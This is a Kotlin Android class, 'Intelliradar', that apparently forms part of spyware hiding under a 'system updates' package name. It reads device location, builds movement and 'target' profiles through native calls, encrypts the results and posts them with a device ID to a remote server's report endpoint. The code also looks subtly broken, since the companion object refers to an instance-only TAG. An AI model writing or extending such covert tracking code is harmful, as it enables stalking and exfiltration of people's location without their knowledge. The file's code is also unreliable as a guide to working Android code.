package com.system.updates.modules.bridges

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationManager
import android.os.Build
import android.util.Log
import androidx.core.content.ContextCompat
import com.system.updates.core.CryptoManager
import com.system.updates.error.ErrorHandler
import com.system.updates.network.NetworkUtils
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.ObjectOutputStream
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class Intelliradar(
    private val context: Context,
    private val cryptoManager: CryptoManager,
    private val errorHandler: ErrorHandler,
    private val networkUtils: NetworkUtils
) {

    private val TAG = "IntelliradarBridge"
    private val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
    private val random = SecureRandom()

    companion object {
        init {
            try {
                System.loadLibrary("intelliradar_native")
                Log.i(TAG, "Native library 'intelliradar_native' loaded successfully.")
            } catch (e: UnsatisfiedLinkError) {
                Log.e(TAG, "Failed to load native library: ${e.message}")
            }
        }
    }

    // Native methods
    private external fun nativeAnalyzeMovement(locationData: ByteArray): String
    private external fun nativeProfileTarget(networkData: ByteArray, geoData: ByteArray): Boolean
    private external fun nativeDetectAnomalies(behaviorData: ByteArray): String

    /**
     * Check location permissions based on Android version.
     */
    fun hasLocationPermission(): Boolean {
        val fineLocation = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
        val coarseLocation = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION)
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            fineLocation == PackageManager.PERMISSION_GRANTED || coarseLocation == PackageManager.PERMISSION_GRANTED
        } else {
            fineLocation == PackageManager.PERMISSION_GRANTED && coarseLocation == PackageManager.PERMISSION_GRANTED
        }
    }

    /**
     * Request location updates (you would typically call this from an activity/fragment).
     */
    fun requestLocationPermissions(activity: android.app.Activity, requestCode: Int) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            activity.requestPermissions(
                arrayOf(
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION
                ),
                requestCode
            )
        }
    }

    /**
     * Get last known location (requires permissions).
     */
    fun getLastLocation(): Location? {
        return if (hasLocationPermission()) {
            try {
                locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                    ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            } catch (e: SecurityException) {
                errorHandler.logError("LOC_PERM", e.message ?: "SecurityException", module = TAG)
                null
            } catch (e: Exception) {
                errorHandler.logError("LOC_ERR", e.message ?: "Unknown", module = TAG)
                null
            }
        } else {
            null
        }
    }

    /**
     * Collect and encrypt location data for analysis.
     */
    fun collectAndEncryptLocation(): String? {
        val location = getLastLocation() ?: return null
        val json = JSONObject().apply {
            put("lat", location.latitude)
            put("lon", location.longitude)
            put("accuracy", location.accuracy)
            put("time", location.time)
            put("provider", location.provider)
        }
        return encryptData(json.toString())
    }

    /**
     * Analyze movement patterns using native library.
     */
    fun analyzeMovementPatterns(locationHistory: List<Location>): String? {
        return try {
            val bytes = serializeLocationList(locationHistory)
            val encrypted = cryptoManager.encryptData(bytes, "movement".toByteArray())
            val result = nativeAnalyzeMovement(encrypted)
            result
        } catch (e: Exception) {
            errorHandler.logError("ANALYZE_ERR", e.message ?: "Unknown", module = TAG)
            null
        }
    }

    /**
     * Profile target using network and geo data.
     */
    fun profileTarget(networkData: JSONObject, geoData: JSONObject): Boolean {
        return try {
            val netBytes = networkData.toString().toByteArray()
            val geoBytes = geoData.toString().toByteArray()
            val encryptedNet = cryptoManager.encryptData(netBytes, "network".toByteArray())
            val encryptedGeo = cryptoManager.encryptData(geoBytes, "geo".toByteArray())
            nativeProfileTarget(encryptedNet, encryptedGeo)
        } catch (e: Exception) {
            errorHandler.logError("PROFILE_ERR", e.message ?: "Unknown", module = TAG)
            false
        }
    }

    /**
     * Detect behavioral anomalies.
     */
    fun detectAnomalies(behaviorData: JSONObject): String? {
        return try {
            val bytes = behaviorData.toString().toByteArray()
            val encrypted = cryptoManager.encryptData(bytes, "behavior".toByteArray())
            nativeDetectAnomalies(encrypted)
        } catch (e: Exception) {
            errorHandler.logError("ANOMALY_ERR", e.message ?: "Unknown", module = TAG)
            null
        }
    }

    /**
     * Send analysis results to server.
     */
    fun sendAnalysisReport(deviceId: String, reportData: JSONObject): Boolean {
        return try {
            val encrypted = cryptoManager.encryptData(reportData.toString().toByteArray())
            val b64 = android.util.Base64.encodeToString(encrypted, android.util.Base64.NO_WRAP)
            val response = networkUtils.httpPost(
                networkUtils.getBaseUrl() + "/api/analysis/report",
                "device_id=$deviceId&report=$b64"
            )
            response.startsWith("200") || response.startsWith("201")
        } catch (e: Exception) {
            errorHandler.logError("SEND_REPORT", e.message ?: "Unknown", module = TAG)
            false
        }
    }

    /**
     * Encrypt data before passing to native or sending.
     */
    private fun encryptData(plain: String): String {
        val key = cryptoManager.deriveDeviceKey()
        val iv = ByteArray(12).also { random.nextBytes(it) }
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(key, "AES"), GCMParameterSpec(128, iv))
        val ct = cipher.doFinal(plain.toByteArray())
        val full = iv + ct
        return android.util.Base64.encodeToString(full, android.util.Base64.NO_WRAP)
    }

    /**
     * Serialize list of locations to byte array.
     */
    private fun serializeLocationList(locations: List<Location>): ByteArray {
        val baos = ByteArrayOutputStream()
        val oos = ObjectOutputStream(baos)
        oos.writeInt(locations.size)
        for (loc in locations) {
            oos.writeDouble(loc.latitude)
            oos.writeDouble(loc.longitude)
            oos.writeFloat(loc.accuracy)
            oos.writeLong(loc.time)
            oos.writeUTF(loc.provider ?: "unknown")
        }
        oos.flush()
        return baos.toByteArray()
    }

    /**
     * Initialize the bridge (placeholder for any setup).
     */
    fun initialize() {
        Log.i(TAG, "Intelliradar Bridge initialized.")
    }
}